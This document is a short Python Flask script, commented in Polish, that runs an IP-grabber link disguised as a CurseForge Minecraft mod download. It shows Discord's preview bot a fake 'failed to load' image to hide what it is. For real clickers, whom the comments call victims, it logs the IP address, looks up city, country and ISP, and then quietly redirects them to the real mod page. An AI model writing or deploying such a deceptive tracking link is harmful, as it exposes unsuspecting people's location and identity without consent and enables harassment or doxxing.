from flask import Flask, request, redirect, make_response
import requests
import sys

app = Flask(__name__)

# --- KONFIGURACJA ---
# Nowy obrazek błędu (ten który prosiłeś - "Failed to load")
ERROR_IMG = "https://i.imgur.com/8YvYv9S.png" 
# Prawdziwy link CurseForge, żeby ofiara tam trafiła po logowaniu
FINAL_DESTINATION = "https://www.curseforge.com/minecraft/mc-mods/timeless-and-classics-zero/download/7401617"

@app.route('/minecraft/mc-mods/download/7401617') # Długa ścieżka dla realizmu
def logger():
    ua = request.headers.get('User-Agent', '')
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]

    # Jeśli to bot Discorda - pokazujemy mu błąd obrazka
    if "Discordbot" in ua or "externalhit" in ua.lower():
        response = make_response(redirect(ERROR_IMG))
        response.headers['Content-Type'] = 'image/png'
        return response

    # --- LOGOWANIE DANYCH ---
    # Wymuszamy wypisanie logów natychmiast
    print(f"\n[!!!] KLIKNIĘCIE: {ip}", flush=True)
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=5).json()
        if r.get("status") == "success":
            print(f"LOKALIZACJA: {r.get('city')}, {r.get('country')}", flush=True)
            print(f"ISP: {r.get('isp')}", flush=True)
    except Exception as e:
        print(f"Błąd logowania: {e}", flush=True)

    # PRZEKIEROWANIE DO CURSEFORGE
    return redirect(FINAL_DESTINATION)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
